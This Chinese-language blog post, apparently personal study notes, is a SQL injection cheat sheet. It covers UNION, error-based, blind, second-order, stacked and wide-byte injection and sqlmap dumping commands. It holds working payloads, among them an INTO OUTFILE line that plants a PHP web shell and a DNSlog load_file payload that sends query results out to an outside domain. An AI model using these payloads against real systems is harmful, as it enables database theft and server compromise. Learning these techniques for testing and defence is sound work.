webе®үе…Ё-SQLжіЁе…Ҙ

еҸ‘иЎЁдәҺ2024-01-23|жӣҙж–°дәҺ2024-01-24|зҹҘиҜҶзӮ№
|еӯ—ж•°жҖ»и®Ў:1.6k|йҳ…иҜ»ж—¶й•ҝ:6еҲҶй’ҹ|йҳ…иҜ»йҮҸ:

жіЁе…ҘжөҒзЁӢ

1.еҲӨж–ӯжіЁе…ҘзӮ№(url,иҫ“е…ҘжЎҶ,иҜ·жұӮеӨҙдёӯзӯүдёҺж•°жҚ®еә“дәӨдә’зҡ„ең°ж–№)

2.еҲӨж–ӯжҳҜеӯ—з¬ҰеһӢиҝҳжҳҜж•°еӯ—еһӢ(жіЁе…Ҙand 1=1 1=2 жҲ–иҖ… 3-1зұ»дјјж–№ејҸ)

3.иӢҘжҳҜеӯ—з¬ҰеһӢ,жүҫеҲ°й—ӯеҗҲж–№ејҸ,зұ»дјј:

4.еҲӨж–ӯжҹҘиҜўеҲ—ж•°й•ҝзҹӯ(group by жҲ–иҖ… order by)

жіЁ:

  • иӢҘжңүеӣһжҳҫ,жҹҘиҜўеӣһжҳҫдҪҚ(жҹҘиҜў-1)еҗҺеҸҜд»ҘеҲ©з”ЁunionиҒ”еҗҲжіЁе…Ҙ

  • иӢҘж— еӣһжҳҫ(жңүжҠҘй”ҷеӣһжҳҫ),еҸҜд»ҘйҖүжӢ©зӣІжіЁ(еёғе°”зӣІжіЁе’Ңж—¶й—ҙзӣІжіЁ)жҲ–жҠҘй”ҷжіЁе…Ҙ,иӢҘе…¶дёӯйЎөйқўеҜ№жіЁе…Ҙзҡ„зңҹеҒҮж— еҸҚеә”,еҲҷж— жі•дҪҝз”Ёеёғе°”зӣІжіЁ

  • иӢҘж— еӣһжҳҫ(ж— жҠҘй”ҷеӣһжҳҫ),еҗҢдёҠдҪҶдёҚиғҪдҪҝз”ЁжҠҘй”ҷжіЁе…Ҙ

unionиҒ”еҗҲжіЁе…Ҙ

1.еҲӨж–ӯеӣһжҳҫдҪҚunion select 1,2,3,...,n

2.дҫқж¬ЎеңЁеӣһжҳҫдҪҚжҹҘеә“,иЎЁ,еҲ—еҗҚ:

  • жҹҘеә“:database()

  • жҹҘиЎЁ:select group_concat(table_name) from information_schema.tables where table_schema='security'

  • жҹҘеҲ—:select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='emails'

  • жҹҘж•°жҚ®:select email_id from emails limit 0, 1
    select email_id from emails limit 1, 1
    select email_id from emails limit 2, 1
    вҖҰвҖҰ.

еёёз”Ёзҡ„жҠҘй”ҷжіЁе…Ҙ

д»ҘдёӢеҮҪж•°еҶ…зҡ„ж•°еӯ—з”ЁжқҘеҚ дҪҚ(ж— е®һйҷ…ж„Ҹд№ү,еҸҜд»Ҙиҫ“е…Ҙе…¶д»–еӯ—з¬Ұ)

extractvalueжҠҘй”ҷ

  • жҹҘеә“:and(иҝҷйҮҢд№ҹеҸҜд»ҘеҲ©з”Ёunion select,д»ҘдёӢеҗҢзҗҶ) extractvalue(1, concat(0x7e(**жіўжөӘеҸ·зҡ„ASCIIеҖј**),(select database()))) --+

  • жҹҘиЎЁ:and extractvalue(1, concat('~',(select group_concat(table_name) from information_schema.tables where table_schema='security')))--+

  • жҹҘеҲ—:and extractvalue(1, concat('~',(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='emails')))--+

  • жҹҘж•°жҚ®:and extractvalue(1, concat('~',(select email_id from emails limit 0,1)))--+

updatexmlжҠҘй”ҷ

е’ҢдёҠдёҖдёӘеҮҪж•°еҗҢзҗҶ,еҰӮжҹҘиЎЁ:and updatexml(1, concat('~',database()), 3)--+

floorжҠҘй”ҷ

payload(жҹҘиЎЁ):select count(*),2,concat(':',(select database()),':',floor(rand()*2))as a from information_schema.tables group by a

жҹҘе…¶д»–ж•°жҚ®дҝ®ж”№зӣёеә”дҪҚзҪ®еҚіеҸҜ

еёғе°”зӣІжіЁ

еҲ©з”Ё:length(database())е’Ңж•°еӯ—жҜ”иҫғи§ӮеҜҹйЎөйқўзҡ„зңҹеҒҮеҖјзҲҶеә“еҗҚй•ҝеәҰ

еҰӮ:length(database())>=8йЎөйқўиҝ”еӣһзңҹ,иҖҢlength(database())>=9йЎөйқўиҝ”еӣһеҒҮ,еҲҷеә“еҗҚй•ҝеәҰдёә8

еҶҚеҲ©з”Ё:ascii(substr((database()),1,1))зӣёеә”зҡ„е’Ңеҗ„дёӘеӯ—жҜҚзҡ„asciiз ҒеҖјжҜ”иҫғ,йҮҚеӨҚеӨҡж¬Ў,и§ӮеҜҹйЎөйқўзҡ„зңҹеҒҮеҖјзҲҶеә“еҗҚ

еҰӮ:ascii(substr((database()),1,1))=97йЎөйқўиҝ”еӣһзңҹ,еҲҷеә“еҗҚз¬¬дёҖдёӘеӯ—жҜҚдёәasciiз ҒеҖјдёә97зҡ„еӯ—жҜҚ(a)

ж—¶й—ҙзӣІжіЁ

еҲ©з”Ёif(condition,sleep(0),sleep(3)),е…¶дёӯд»Һconditionдёәеёғе°”зӣІжіЁзҡ„еҮ дёӘжӯҘйӘӨ

еҮҪж•°йҖҡиҝҮеҲӨж–ӯconditionйғЁеҲҶзҡ„зңҹеҒҮжқҘиҝ”еӣһsleep(0)жҲ–sleep(3),иҖҢеҗҺжҲ‘д»¬и§ӮеҜҹйЎөйқўе“Қеә”ж—¶й—ҙжқҘеҲӨж–ӯиҜӯеҸҘзңҹеҒҮзҲҶеҮәж•°жҚ®

ж— еҲ—еҗҚжіЁе…Ҙ

  • иӢҘеӨҡеӯ—ж®өпјҡselect `x` from(select 1,2,3,4,xxx from table_name union select * from table_name)

  • иӢҘеҚ•еӯ—ж®өпјҡselect *,1,2,xxx from table_name

select 1,"<?php @assert($_POST['t']);?>" into outfile '/var/www/html/1.php';

  • зӣ®ж Үзӣ®еҪ•еҸҜеҶҷпјҢmysqlзҡ„жқғйҷҗи¶іеӨҹгҖӮ

DNSlogжіЁе…Ҙ

еҗҢдёҠйңҖиҰҒиҜ»еҶҷжқғйҷҗ,дё”жңҚеҠЎеҷЁйңҖиҰҒжһ¶и®ҫеңЁwindowsзі»з»ҹдёҠ

payload:load_file(concat('\\',(condition),'.xxxx.ceye.io\xxxx.txt')),е…¶дёӯдҝ®ж”№conditionйғЁеҲҶеҒҡеҲ°жҹҘеә“,иЎЁ,еҲ—еҗҚ

еҰӮ:жіЁе…Ҙload_file(concat('\\',(select database()),'.xxxx.ceye.io\xxxx'))еҗҺ,еҲ°http://www.ceye.ioжҹҘзңӢеҹҹеҗҚи§Јжһҗз»“жһң,е°ұиғҪжҳҫзӨәеҮәеә“еҗҚ

д№ҹеҸҜд»ҘйҖүжӢ©з”Ёhttp://www.dnslog.cnиҺ·еҸ–еҹҹеҗҚдҪңдёәpayloadжңҖеҗҺдёҖйғЁеҲҶзҡ„еҹҹеҗҚеҶ…е®№,и§ЈжһҗеҗҺиҺ·еҫ—з»“жһң

жіЁ: иӢҘеӨұиҙҘ,еҸҜд»Ҙе°қиҜ•иҪ¬д№үвҖқ\\вҖңз¬ҰеҸ·,еҶҷе…ҘеӣӣдёӘеҸҚж–ңжқ 

дәҢж¬ЎжіЁе…Ҙ

жқЎд»¶: з”ЁжҲ·еҗ‘ж•°жҚ®еә“жҸ’е…ҘжҒ¶ж„ҸиҜӯеҸҘпјҲеҚі:дҪҝеҗҺз«Ҝд»Јз ҒеҜ№иҜӯеҸҘиҝӣиЎҢдәҶиҪ¬д№үпјҢеҰӮmysql_escape_stringгҖҒmysql_real_escape_stringиҪ¬д№үпјү

иҜҰи§Ј: https://blog.csdn.net/hhhhhhhhh85/article/details/121328475

еҲ©з”Ё: еңЁжңүиҪ¬д№үеӨ„еҶҷе…ҘжҒ¶ж„Ҹд»Јз Ғ(еҰӮеңЁжіЁеҶҢеӨ„)adminвҖҷ#еӯҳе…ҘдәҶж•°жҚ®еә“,дҪҶеӣ иҪ¬д№үдёҚдјҡеҪўжҲҗsqlжіЁе…Ҙ

  д№ӢеҗҺзҷ»еҪ•ж—¶иӢҘе№іеҸ°зӣҙжҺҘд»Һж•°жҚ®еә“жӢҝеҮәжӯӨж•°жҚ®(дёҚиҝӣиЎҢиҪ¬д№ү),йӮЈд№Ҳе°ұдјҡеҪўжҲҗsqlжіЁе…Ҙ

  дҫӢеҰӮ:жӢҝеҮәж•°жҚ®еҗҺеҪўжҲҗиҝҷж ·зҡ„е‘Ҫд»ӨвҖңUPDATE users SET PASSWORD=вҖҳ123456вҖҷ where username=вҖҳadminвҖҷ#вҖҷ and password=вҖҷ$curr_passвҖҷвҖқ,йӮЈд№Ҳе°ұдјҡд»ҘиҙҰжҲ·дёәadminзҷ»еҪ•жҲҗеҠҹ

е ҶеҸ жіЁе…Ҙ

е°ҶиҜӯеҸҘе ҶеҸ еңЁдёҖиө·иҝӣиЎҢжҹҘиҜўзҡ„еҲ©з”Ёж–№ејҸ,еӣ дёәmysql_multi_query()ж”ҜжҢҒеӨҡжқЎsqlиҜӯеҸҘеҗҢж—¶жү§иЎҢ,д»Ҙ;дҪңдёәеҲҶйҡ”з¬Ұ

дҫӢеҰӮ:select * from users;show databases; еҗҢж—¶жү§иЎҢдәҶдёӨжқЎиҜӯеҸҘ

е®Ҫеӯ—иҠӮжіЁе…Ҙ

жқЎд»¶: е°Ҷз”ЁжҲ·иҫ“е…ҘиҪ¬д№үе№¶иҝӣиЎҢGBKзј–з Ғзҡ„е№іеҸ°

й—ӯеҗҲејҸйңҖиҰҒжіЁе…Ҙ:%df'--+,д№ӢеҗҺжҹҘж•°жҚ®ж“ҚдҪңдёҚеҸҳ

еҺҹзҗҶ: еҗҺеҸ°е°ҶеҚ•еј•еҸ·(вҖҳ)иҪ¬д№үжҲҗж–ңжқ еҚ•еј•еҸ·(\вҖҳ),еҲҷpayloadеҸҳдёә%df\'--+,дҪҶ%df\иҝӣиЎҢGBKзј–з ҒеҗҺдјҡеҸҳдёәдёӯж–Үеӯ—з¬Ұ,еҜјиҮҙж•°жҚ®еә“ж— жі•иҜҶеҲ«,йӮЈд№ҲеҚ•еј•еҸ·е°ұиў«дҝқз•ҷдёӢжқҘжҲҗеҠҹжӢҘжңүй—ӯеҗҲдҪңз”ЁдәҶ

SqlMap

1.еҲӨж–ӯжҳҜеҗҰеӯҳеңЁжіЁе…Ҙ

зӣ®ж ҮжіЁе…ҘзӮ№дёәhttp://xxx.com/index.php?id=1иҝҷз§Қдј е…ҘеҸӮж•°зҡ„е‘Ҫд»Өдёәsqlmap -u http://xxx.com/index.php?id=1 дҫҝеҸҜд»ҘиҮӘеҠЁиҝӣиЎҢжЈҖжөӢпјҢеҸҰеӨ–еҰӮжһңдј е…Ҙзҡ„еҸӮж•°жңүеӨ§дәҺзӯүдәҺдёӨдёӘж—¶пјҢйңҖиҰҒе°ҶURLдҪҝз”ЁеҸҢеј•еҸ·жӢ¬иө·жқҘгҖӮ

йҷӨдәҶзӣҙжҺҘжЈҖжөӢURLеӨ–пјҢsqlmapиҝҳеҸҜд»Ҙд»Һж–Үжң¬дёӯиҺ·еҸ–HTTPиҜ·жұӮпјҢжүҖд»ҘжҲ‘д»¬еҸҜд»Ҙз”Ёburpsuitе°ҶHTTPиҜ·жұӮжҠ“еҢ…пјҢз„¶еҗҺдҝқеӯҳеҲ°жң¬ең°дёәTXTж–Үд»¶пјҢз„¶еҗҺдҪҝз”ЁsqlmapжқҘиҝӣиЎҢжөӢиҜ•пјҢе…·дҪ“е‘Ҫд»Өдёәsqlmap -r ж–Үд»¶и·Ҝеҫ„е’Ңж–Үд»¶еҗҚпјҢ

иҝҷз§ҚдёҖиҲ¬з”ЁжқҘжЈҖжөӢpostжіЁе…Ҙе’ҢHTTPеӨҙжіЁе…ҘгҖӮ

2.жҹҘиҜўеҪ“еүҚз”ЁжҲ·дёӢзҡ„жүҖжңүж•°жҚ®еә“

sqlmap -u http://xxx.com/index.php?id=1 --dbs

3.иҺ·еҸ–ж•°жҚ®еә“зҡ„иЎЁеҗҚ

sqlmap -u http://xxx.com/index.php?id=1 -D ж•°жҚ®еә“еҗҚ --tables

иҝҷдёӘе‘Ҫд»ӨеҸҜд»ҘжҹҘиҜўжҢҮе®ҡж•°жҚ®еә“дёӯзҡ„жүҖжңүиЎЁеҗҚгҖӮ

4.иҺ·еҸ–иЎЁдёӯзҡ„еӯ—ж®өеҗҚ

sqlmap.py -u http://xxx.com/index.php?id=1 -D ж•°жҚ®еә“еҗҚ -T иЎЁеҗҚ --columns

5.иҺ·еҸ–еӯ—ж®өзҡ„еҶ…е®№

sqlmap -u http://xxx.com/index.php?id=1 -D ж•°жҚ®еә“еҗҚ -T иЎЁеҗҚ -C еӯ—ж®өеҗҚ --dump

6.иҺ·еҸ–ж•°жҚ®еә“зҡ„жүҖжңүз”ЁжҲ·е’Ңз”ЁжҲ·зҡ„еҜҶз Ғ

sqlmap -u http://xxx.com/index.php?id=1вҖқ --users

sqlmap -u http://xxx.com/index.php?id=1вҖқ --passwords
